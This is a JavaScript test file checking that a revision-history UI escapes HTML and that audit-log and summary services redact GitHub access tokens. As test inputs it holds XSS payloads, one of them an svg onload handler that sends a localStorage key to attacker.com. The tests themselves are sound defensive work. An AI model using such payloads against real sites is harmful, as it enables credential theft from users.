import { describe, it, expect, beforeEach } from 'vitest';
import { HistoryDiffModalComponent } from '../../src/components/history/history-diff-modal.js';
import { HistoryPanelComponent } from '../../src/components/history/history-panel.js';
import { AuditLogService } from '../../src/services/audit-log-service.js';
import { ChangeSummaryService } from '../../src/services/change-summary-service.js';

describe('Revision History & Audit Trail Security (Release 0.6)', () => {
  describe('XSS Prevention (Invariant 8)', () => {
    it('HistoryDiffModalComponent escapes malicious HTML characters in diff content', () => {
      const modal = new HistoryDiffModalComponent();
      const malicious = '<script>alert("xss")</script><img src=x onerror=alert(1)>';
      const escaped = modal.escapeHtml(malicious);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
      expect(escaped).toContain('&quot;xss&quot;');
    });

    it('HistoryPanelComponent escapes malicious HTML in summaries and audit details', () => {
      const panel = new HistoryPanelComponent();
      const payload = 'Updated document <svg onload=fetch("http://attacker.com?token=" + localStorage.getItem("key"))>';
      const escaped = panel.escapeHtml(payload);

      expect(escaped).not.toContain('<svg');
      expect(escaped).toContain('&lt;svg');
      expect(escaped).not.toContain('>');
      expect(escaped).toContain('&gt;');
    });
  });

  describe('Zero Credential Leakage (Invariant 8)', () => {
    let mockStorage;
    let auditLog;

    beforeEach(() => {
      mockStorage = {
        _data: {},
        getItem(k) { return this._data[k] !== undefined ? this._data[k] : null; },
        setItem(k, v) { this._data[k] = String(v); },
        removeItem(k) { delete this._data[k]; },
        clear() { this._data = {}; },
      };
      auditLog = new AuditLogService({ storage: mockStorage });
    });

    it('redacts GitHub Personal Access Tokens and Fine-grained PATs in audit logs', () => {
      const classicToken = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456';
      const fineGrained = 'github_pat_11ABCD_1234567890abcdefghijklmnopqrstuvwxyz';
      const appToken = 'ghu_1234567890abcdefghijklmnopqrstuvwxyz';

      const event = auditLog.recordEvent({
        documentKey: 'config.md',
        action: 'PUBLISH_ATTEMPT',
        outcome: 'FAILURE',
        summary: `Auth failed for ${classicToken}`,
        details: {
          pat: fineGrained,
          token2: appToken,
        },
      });

      expect(event.summary).not.toContain(classicToken);
      expect(event.summary).toContain('[REDACTED_TOKEN]');
      expect(event.details.pat).not.toContain(fineGrained);
      expect(event.details.pat).toContain('[REDACTED_PAT]');
      expect(event.details.token2).not.toContain(appToken);
      expect(event.details.token2).toContain('[REDACTED_TOKEN]');
    });

    it('redacts secrets in change summary service', () => {
      const summaryService = new ChangeSummaryService();
      const summary = summaryService.generateSummary({
        source: 'local_save',
        customMessage: 'Committed using token gho_SECRETKEY123456789',
      });

      expect(summary).not.toContain('gho_SECRETKEY123456789');
      expect(summary).toContain('[REDACTED_TOKEN]');
    });
  });
});
